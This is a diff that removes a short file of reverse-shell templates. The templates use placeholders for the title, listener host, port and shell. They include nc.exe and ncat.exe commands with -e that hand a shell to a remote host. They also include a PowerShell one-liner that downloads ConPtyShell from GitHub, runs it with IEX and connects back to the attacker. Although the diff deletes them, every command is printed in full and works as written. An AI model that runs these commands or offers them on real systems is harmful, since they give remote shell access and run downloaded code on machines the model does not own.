@@ -1,8 +1,0 @@
-(titulo) nc.exe -e
-nc.exe (lhost) (lport) -e (shell)
-
-(titulo) ncat.exe -e
-ncat.exe (lhost) (lport) -e (shell)
-
-(titulo)  Windows ConPty
-IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell (lhost) (lport)
